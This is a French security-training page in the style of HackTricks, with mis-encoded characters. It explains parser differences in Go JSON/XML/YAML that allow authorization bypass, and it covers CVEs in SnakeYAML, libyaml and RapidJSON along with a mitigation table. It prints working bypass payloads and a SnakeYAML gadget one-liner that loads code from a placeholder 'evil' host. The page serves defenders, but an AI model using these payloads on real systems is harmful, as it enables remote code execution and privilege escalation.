# JSON, XML & Yaml Hacking & Issues

{{#include ../banners/hacktricks-training.md}}

## D√©codeur JSON Go

Les probl√®mes suivants ont √©t√© d√©tect√©s dans le Go JSON bien qu'ils puissent √©galement √™tre pr√©sents dans d'autres langages. Ces probl√®mes ont √©t√© publi√©s dans [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/).

Les parseurs JSON, XML et YAML de Go pr√©sentent une longue s√©rie d'incoh√©rences et de valeurs par d√©faut non s√©curis√©es qui peuvent √™tre exploit√©es pour **bypass authentication**, **escalate privileges**, ou **exfiltrate sensitive data**.


### (Un)Marshaling Donn√©es inattendues

L'objectif est d'exploiter des structs qui permettent √† un attaquant de lire/√©crire des champs sensibles (par ex., `IsAdmin`, `Password`).

- Exemple de struct:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- Vuln√©rabilit√©s courantes

1. **Tag manquant** (no tag = le champ est encore analys√© par d√©faut):
```go
type User struct {
Username string
}
```
Payload:
```json
{"Username": "admin"}
```
2. **Utilisation incorrecte de `-`**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // ‚ùå wrong
}
```
Payload:
```json
{"-": true}
```
‚úîÔ∏è Fa√ßon correcte d'emp√™cher qu'un champ soit (d√©)s√©rialis√© :
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### Diff√©rences entre parseurs

Le but est de contourner l'autorisation en exploitant la fa√ßon dont diff√©rents parseurs interpr√®tent diff√©remment le m√™me payload, par exemple :
- CVE-2017-12635: Apache CouchDB bypass via cl√©s dupliqu√©es
- 2022: Zoom 0-click RCE via incoh√©rence du parser XML
- GitLab 2025 SAML bypass via particularit√©s XML


**1. Champs dupliqu√©s :**
Le `encoding/json` de Go prend le champ **dernier**.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
D'autres parseurs (par ex., Java‚Äôs Jackson) peuvent prendre le **premier**.

**2. Insensibilit√© √† la casse:**
Go est insensible √† la casse:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
M√™me les astuces Unicode fonctionnent :
```go
json.Unmarshal([]byte(`{"a‚Ñ™tion≈ø": "bypass"}`), &req)
```
**3. Cross-service mismatch:**
Imaginez :
- Proxy written in Go
- AuthZ service written in Python

L'attaquant envoie :
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python voit `UserAction`, l'autorise
- Go voit `AdminAction`, l'ex√©cute


### Confusion de formats de donn√©es (Polyglots)

Le but est d'exploiter des syst√®mes qui m√©langent des formats (JSON/XML/YAML) ou qui restent permissifs en cas d'erreurs du parseur, par exemple :
- **CVE-2020-16250** : HashiCorp Vault a analys√© du JSON avec un parseur XML apr√®s que STS ait renvoy√© du JSON au lieu de XML.

L'attaquant contr√¥le :
- L'en-t√™te `Accept: application/json`
- Contr√¥le partiel du corps JSON

Le parseur XML de Go l'a **quand m√™me** analys√© et a fait confiance √† l'identit√© inject√©e.

- Payload con√ßu :
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
R√©sultat :
- **Go JSON** parseur : `Action_2` (insensible √† la casse + la derni√®re valeur l'emporte)
- **YAML** parseur : `Action_1` (sensible √† la casse)
- **XML** parseur : analyse `"Action_3"` √† l'int√©rieur de la cha√Æne

---

## Vuln√©rabilit√©s notables des parseurs (2023-2025)

> Les probl√®mes publiquement exploitables ci‚Äëdessous montrent que l'analyse non s√©curis√©e est un probl√®me multilingue ‚Äî pas seulement un probl√®me Go.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* Affecte : `org.yaml:snakeyaml` < **2.0** (utilis√© par Spring-Boot, Jenkins, etc.).
* Cause racine : `new Constructor()` d√©s√©rialise **des classes Java arbitraires**, permettant des cha√Ænes de gadgets qui culminent en ex√©cution de code √† distance.
* PoC en une ligne (ouvrira la calculatrice sur l'h√¥te vuln√©rable) :
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* Correctif / Att√©nuation :
1. **Mettre √† niveau vers ‚â•2.0** (utilise `SafeLoader` par d√©faut).
2. Sur les versions plus anciennes, utilisez explicitement `new Yaml(new SafeConstructor())`.

### libyaml Double-Free (CVE-2024-35325)

* Affecte : `libyaml` ‚â§0.2.5 (biblioth√®que C utilis√©e par de nombreux bindings).
* Probl√®me : Appeler `yaml_event_delete()` deux fois conduit √† un double-free que des attaquants peuvent transformer en DoS ou, dans certains sc√©narios, en exploitation du heap.
* Statut : L'amont a rejet√© comme un ¬´ API misuse ¬ª, mais les distributions Linux ont livr√© la version corrig√©e **0.2.6** qui met le pointeur √† NULL avant de le lib√©rer de fa√ßon d√©fensive.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* Affecte : Tencent **RapidJSON** avant le commit `8269bc2` (<1.1.0-patch-22).
* Bug : Dans `GenericReader::ParseNumber()` des calculs non v√©rifi√©s permettent √† des attaquants de fabriquer des litt√©raux num√©riques √©normes qui d√©bordent et corrompent le heap ‚Äî finissant par permettre une escalation de privil√®ges lorsque le graphe d'objets r√©sultant est utilis√© pour des d√©cisions d'autorisation.

---

### üîê Att√©nuations (Mises √† jour)

| Risque                              | Correctif / Recommandation                                |
|-------------------------------------|------------------------------------------------------------|
| Champs inconnus (JSON)              | `decoder.DisallowUnknownFields()`                          |
| Champs dupliqu√©s (JSON)             | ‚ùå Pas de correctif dans la stdlib ‚Äî valider avec [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) |
| Correspondance insensible √† la casse (Go) | ‚ùå Pas de correctif ‚Äî valider les struct tags + pr√©-canoniser l'entr√©e |
| Donn√©es XML ind√©sirables / XXE      | Utiliser un parseur durci (`encoding/xml` + `DisallowDTD`) |
| Cl√©s YAML inconnues                 | `yaml.KnownFields(true)`                                   |
| **Unsafe YAML deserialization**     | Utiliser SafeConstructor / mettre √† niveau vers SnakeYAML ‚â•2.0 |
| libyaml ‚â§0.2.5 double-free          | Mettre √† jour vers **0.2.6** ou version distro-patch√©e    |
| RapidJSON <patched commit           | Compiler contre la derni√®re version de RapidJSON (‚â•juillet 2024) |

## Voir aussi

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## R√©f√©rences

- Baeldung ‚Äì ‚ÄúResolving CVE-2022-1471 With SnakeYAML 2.0‚Äù
- Ubuntu Security Tracker ‚Äì CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
